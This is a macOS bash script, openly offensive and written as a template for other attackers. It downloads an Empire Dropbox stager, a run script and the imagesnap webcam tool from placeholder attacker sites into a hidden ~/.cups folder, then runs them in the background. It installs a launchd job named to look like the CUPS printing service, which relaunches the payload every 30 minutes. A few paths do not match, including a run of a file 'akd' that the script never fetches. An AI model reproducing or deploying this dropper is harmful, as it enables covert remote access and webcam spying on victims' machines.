#!/bin/bash

# dig a hole
HOSTNAME=`/bin/hostname`
USERNAME=`/usr/bin/whoami`
PYTHON=`which python`

# put some shit in the hole

# I specifically use ~/.cups because of that one thing that happened at
# twitter that one time. Ask me about it someday.
mkdir /Users/$USERNAME/.cups 2>&1>/dev/null

# This is where you curl or otherwise pull down your mauljuarez
# I did it with simple curl commands. You can do it however you want.
# one here was a python dropbox stager for empire. I called it 'login'.
curl -s -o /Users/$USERNAME/.cups/login http://<your hax0r site>/dbxpy 2>&1>/dev/null

# download your run script, which will be run using the plist generated below
curl -s -o /Users/$USERNAME/.cups/cups.sh http://<your hax0r site>/cups.sh 2>&1>/dev/null

# imagesnap is what take webcam pics
curl -s -o /Users/$USERNAME/.dtc2/imagesnap http:///<evilsite>/imagesnap 2>&1>/dev/null
chmod +x /Users/$USERNAME/.dtc2/imagesnap

# chmod your mauljuarez so they're executable.
chmod +x /Users/$USERNAME/.cups/cups.sh 2>&1>/dev/null
chmod +x /Users/$USERNAME/.cups/login 2>&1>/dev/null

# run the mauljuarez
/usr/bin/python /Users/$USERNAME/.cups/akd 2>&1>/dev/null &
/Users/$USERNAME/.cups/akd 2>&1>/dev/null &

# create plist
# its default is set to 1800 seconds, or 30 minutes.
# change as appropriate
# You can see that the job it creates is calling itself "net.cups"
# feel free to change this, but the idea is to be sort of stealthy
echo "" > /Users/$USERNAME/.cups/debug.plist
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" >> /Users/$USERNAME/.cups/debug.plist
echo "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http:///www.apple.com/DTDs/PropertyList-1.0.dtd\">" >> /Users/$USERNAME/.cups/debug.plist
echo "<plist version=\"1.0\">" >> /Users/$USERNAME/.cups/debug.plist
echo "<dict>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <key>Label</key>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <string>net.cups</string>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <key>ProgramArguments</key>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <array>" >> /Users/$USERNAME/.cups/debug.plist
echo "        <string>/Users/$USERNAME/.cups/cups.sh</string>" >> /Users/$USERNAME/.cups/debug.plist
echo "    </array>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <key>StartInterval</key>" >> /Users/$USERNAME/.cups/debug.plist
echo "    <integer>1800</integer>" >> /Users/$USERNAME/.cups/debug.plist
echo "</dict>" >> /Users/$USERNAME/.cups/debug.plist
echo "</plist>" >> /Users/$USERNAME/.cups/debug.plist

# install spy plist plist
launchctl load /Users/$USERNAME/.cups/debug.plist
launchctl start /Users/$USERNAME/.cups/debug.plist
